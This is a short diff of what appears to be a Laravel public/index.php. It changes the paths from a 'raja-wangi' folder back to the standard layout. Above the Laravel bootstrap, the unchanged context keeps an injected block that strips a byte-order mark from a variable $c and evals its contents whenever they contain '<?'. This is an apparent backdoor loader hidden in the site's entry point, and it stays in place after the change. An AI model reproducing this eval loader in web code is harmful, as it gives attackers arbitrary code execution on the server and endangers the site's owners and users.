@@ -48,19 +48,22 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+use Illuminate\Foundation\Application;
 use Illuminate\Http\Request;
 
 define('LARAVEL_START', microtime(true));
 
-// Maintenance mode
-if (file_exists($maintenance = __DIR__.'/../raja-wangi/storage/framework/maintenance.php')) {
+// Determine if the application is in maintenance mode...
+if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
     require $maintenance;
 }
 
-// Autoload Composer
-require __DIR__.'/../raja-wangi/vendor/autoload.php';
+// Register the Composer autoloader...
+require __DIR__.'/../vendor/autoload.php';
 
-// Bootstrap Laravel
-(require_once __DIR__.'/../raja-wangi/bootstrap/app.php')
-    ->handleRequest(Request::capture());
+// Bootstrap Laravel and handle the request...
+/** @var Application $app */
+$app = require_once __DIR__.'/../bootstrap/app.php';
+
+$app->handleRequest(Request::capture());
 
